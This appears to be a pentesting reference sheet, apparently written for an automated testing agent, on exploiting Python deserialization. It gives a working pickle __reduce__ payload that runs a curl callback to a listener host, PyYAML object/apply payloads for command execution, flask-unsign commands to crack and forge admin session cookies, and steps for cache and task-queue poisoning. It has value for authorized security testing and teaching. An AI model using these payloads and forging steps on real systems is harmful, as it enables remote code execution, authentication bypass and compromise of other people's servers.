# Python Deserialization Reference

Use for pickle/marshal, unsafe YAML, and signed session/job/cache objects.
Impact-first: an `UnpicklingError`/constructor error is a positive oracle;
`flask-unsign --sign` with a leaked/cracked key IS the exploit.

## Markers

- Pickle: raw bytes start `\x80` + protocol byte; base64 starts `gA` + a
  protocol-dependent third char. Measured on python 3.12.3:

  | proto | raw prefix | base64 prefix |
  |---|---|---|
  | 2 | `\x80\x02` | `gAJ` |
  | 3 | `\x80\x03` | `gAN` |
  | 4 | `\x80\x04` | `gAS` (`gASV`) |
  | 5 | `\x80\x05` | `gAW` (`gAWV`) |

  Grep `gA[JNSW]`, never `gAS` alone — `gAS` matches only proto 4, and Celery and
  Django pin protocol 2 for compat, so proto 2 is common in queue/cache/cookie
  payloads. `DEFAULT_PROTOCOL` is 4 on 3.12, which is why a `gAS`-only hunt looks
  like it works. Protos 0/1 are textual (`(dp0`, `}q\x00`) with no `\x80` prefix.

  ```bash
  rg -a 'gA[JNSW]' <captures>                 # base64 blobs
  rg -a '(?-u)\x80[\x02-\x05]' <captures>     # raw bytes
  ```
  The `(?-u)` is required: `rg -a '\x80[\x02-\x05]'` without it exits 1 with **no
  output and no error** on a file that does contain pickles — a silent false
  negative, not a clean negative. `grep -P` cannot take the pattern at all
  (`isolated byte with 0x80 bit set`).

  Then: opcodes (`c__builtin__`, `R.`) after decode; `pickle`, `UnpicklingError`,
  `STACK_GLOBAL` in errors.
- PyYAML: `!!python/object`, `!!python/object/apply`, `!!python/name`, constructor
  errors.
- Marshal: raw code objects in internal APIs.
- Signed state: Flask `session=...` (`eyJ...` dot-separated), Django session,
  Celery/RQ task args, cache entries.

## pickle -> RCE

Any endpoint that base64-decodes and `pickle.loads()` (import/export, cache, job
arg, ML/model upload, `__reduce__`-trusting API):
```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://<id>.oob',))   # or ('id',) via a channel
print(base64.b64encode(pickle.dumps(E())).decode())
```
`os.system('id')` has no return channel — use an OOB `curl`/`nslookup` to your
listener as the confirm, or a command that reflects into a readable field. The OOB
callback is the non-destructive RCE proof.

**Oracle first:** flip a byte in an owned pickle blob -> `UnpicklingError` /
`STACK_GLOBAL requires str` confirms `pickle.loads` of your bytes. Positive result.

## PyYAML -> RCE

`yaml.load(x)` without `SafeLoader` (importers, config editors, CI, `/api` that
parses YAML):
```yaml
!!python/object/apply:os.system ["curl http://<id>.oob"]
# or, for a return channel:
!!python/object/apply:subprocess.check_output [["id"]]
```
`!!python/object/apply:...` is the exec tag; `!!python/object:...` instantiates
arbitrary classes. A constructor error naming your tag confirms an unsafe loader.

## Flask — SECRET_KEY session forge (-> pickle RCE)

> **Tooling:** `flask-unsign` is **not installed on this host**. Install it first — `pipx install flask-unsign` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> Credential-free alternative for the *decode* half, which needs nothing installed:
> a Flask session cookie is `<payload>.<timestamp>.<signature>` in base64url, and
> the payload is zlib-compressed when the cookie starts with a leading `.` —
>
> ```bash
> python3 -c "
> import sys,zlib,base64
> c=sys.argv[1]; z=c.startswith('.')
> d=[p for p in c.split('.') if p][0]
> b=base64.urlsafe_b64decode(d+'='*(-len(d)%4))
> print(zlib.decompress(b) if z else b)" '<cookie>'
> ```
>
> That reads the claims and tells you whether the serializer is JSON or pickle.
> Signing — the actual exploit — needs the tool (or `itsdangerous` directly);
> `pipx install flask-unsign` is the short path.

```bash
flask-unsign --decode --cookie 'eyJ...'                       # inspect
flask-unsign --unsign --cookie 'eyJ...' --wordlist keys.txt   # crack OWN cookie, offline
flask-unsign --sign --cookie "{'logged_in':True,'is_admin':True}" --secret '<KEY>'
```
Offline cracking of YOUR captured cookie is allowed; signing with the leaked/cracked
key is the exploit. If the app uses a pickle session serializer (Flask-Session
`SESSION_SERIALIZER='pickle'`, Flask-KVSession, custom `pickle.loads(session[...])`)
-> forge a pickle `__reduce__` gadget -> RCE. Full ladder in `leaked-key-forge.md`.

## Django — SECRET_KEY signed session (-> PickleSerializer RCE)

`SECRET_KEY` leaks via a `DEBUG=True` error page (renders settings) or repo. Forge
any `django.core.signing` value (session, password-reset token). If
`SESSION_SERIALIZER=...PickleSerializer` -> pickle gadget -> RCE. Steps in
`leaked-key-forge.md` (Django section).

## Cache / task-metadata poisoning

Attacker-poisonable storage later `pickle.loads`/`yaml.load`'d by the server:
- file-based caches an attacker can write/replace;
- predictable Redis/Memcached keys;
- Airflow XCom / Celery / RQ task args, scheduled jobs;
- notification queues / stored templates using pickle or unsafe YAML.

Prove: write influence over the key/file with inert content -> confirm the server
later reads it in a trusted context -> then the gadget. Poison a key YOU can write,
not another tenant's.

## Evidence that converts

- OOB callback / reflected output from a pickle `__reduce__` or YAML
  `!!python/object/apply` gadget = RCE.
- `UnpicklingError` / YAML constructor error naming your input = deser confirmed.
- `flask-unsign --sign` / Django-signed forged session accepted = auth bypass;
  pickle serializer escalates it to RCE.

Do NOT stop at "`gA[JNSW]` seen" or "it's a signed cookie" — decode it, test the
serializer, and if a key is leaked, forge.
